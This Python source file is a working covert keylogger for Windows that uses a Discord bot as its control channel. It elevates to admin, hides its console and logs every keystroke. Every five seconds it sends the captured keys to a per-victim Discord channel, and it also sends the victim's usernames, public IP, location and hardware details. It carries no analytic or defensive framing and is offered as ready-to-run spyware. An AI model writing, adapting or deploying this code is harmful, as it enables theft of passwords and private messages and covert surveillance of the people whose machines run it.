import ctypes
import subprocess
import sys
import requests
import json
import os
import platform
import psutil
from pynput import keyboard
import threading
import time
import discord
from discord.ext import commands
import asyncio
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

GUILD_ID = int(os.getenv("GUILD_ID"))  # Replace with your server ID
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")  # Replace with your token
CHANNEL_CATEGORY_NAME = "PC Monitoring"

key_log = []
log_lock = threading.Lock()
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
channel = None

def is_admin():
    """Check if script is running as administrator."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_public_ip():
    """Fetch the public IP address of the machine."""
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        data = response.json()
        return data.get("ip", "Unknown IP"), data.get("region", "Unknown Location")
    except requests.RequestException:
        return "Unknown IP", "Unknown Location"

def get_pc_username():
    """Get the Windows username."""
    return os.getlogin()

def get_microsoft_username():
    """Get the Microsoft account username (if linked)."""
    try:
        result = subprocess.run(
            'powershell.exe -Command "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name"',
            capture_output=True, text=True, shell=True
        )
        return result.stdout.strip()
    except:
        return "Unknown Microsoft User"

def get_system_specs():
    """Retrieve system hardware details."""
    os_version = platform.system() + " " + platform.release()
    cpu_model = platform.processor()
    ram_size = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # Convert to GB

    try:
        gpu_info = subprocess.run(
            'powershell.exe -Command "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name"',
            capture_output=True, text=True, shell=True
        ).stdout.strip()
    except:
        gpu_info = "Unknown GPU"

    return os_version, cpu_model, gpu_info, ram_size

def hide_console():
    """Hide the console window."""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def send_key_logs():
    """Send the buffered key logs every 5 seconds."""
    while True:
        time.sleep(5)
        with log_lock:
            if key_log:
                log_message = "".join(key_log)
                key_log.clear()
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(log_message), bot.loop)

def on_press(key):
    """Callback function when a key is pressed."""
    with log_lock:
        try:
            key_log.append(key.char)
        except AttributeError:
            key_log.append(f"[{key}]")

@bot.event
async def on_ready():
    global channel
    guild = bot.get_guild(GUILD_ID)
    category = discord.utils.get(guild.categories, name=CHANNEL_CATEGORY_NAME)
    if not category:
        category = await guild.create_category(CHANNEL_CATEGORY_NAME)

    pc_username = get_pc_username()
    channel_name = f"{pc_username.lower()}-monitoring"
    channel = discord.utils.get(category.channels, name=channel_name)
    if not channel:
        channel = await category.create_text_channel(channel_name)

    pc_username = get_pc_username()
    microsoft_user = get_microsoft_username()
    public_ip, state = get_public_ip()
    os_version, cpu_model, gpu_info, ram_size = get_system_specs()

    embed = discord.Embed(title="🛠 System Information", description="System information has been collected.", color=discord.Color.red())
    embed.add_field(name="🖥️ PC Username", value=pc_username, inline=True)
    embed.add_field(name="👤 Microsoft Username", value=microsoft_user, inline=True)
    embed.add_field(name="🌐 Public IP", value=public_ip, inline=True)
    embed.add_field(name="📍 State", value=state, inline=True)
    embed.add_field(name="🖥️ OS", value=os_version, inline=True)
    embed.add_field(name="⚡ CPU", value=cpu_model, inline=True)
    embed.add_field(name="🎮 GPU", value=gpu_info, inline=True)
    embed.add_field(name="💾 RAM", value=f"{ram_size} GB", inline=True)
    embed.set_footer(text="System Logger - Secure Monitoring", icon_url="https://cdn-icons-png.flaticon.com/512/616/616494.png")

    await channel.send(embed=embed)
    print("✅ System information collected and sent to Discord.")

@bot.command()
async def openfileexplorer(ctx):
    """Command to open the file explorer."""
    subprocess.Popen('explorer')

if not is_admin():
    print("🔹 Requesting admin privileges...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

hide_console()

threading.Thread(target=send_key_logs, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    bot.run(DISCORD_TOKEN)
    listener.join()
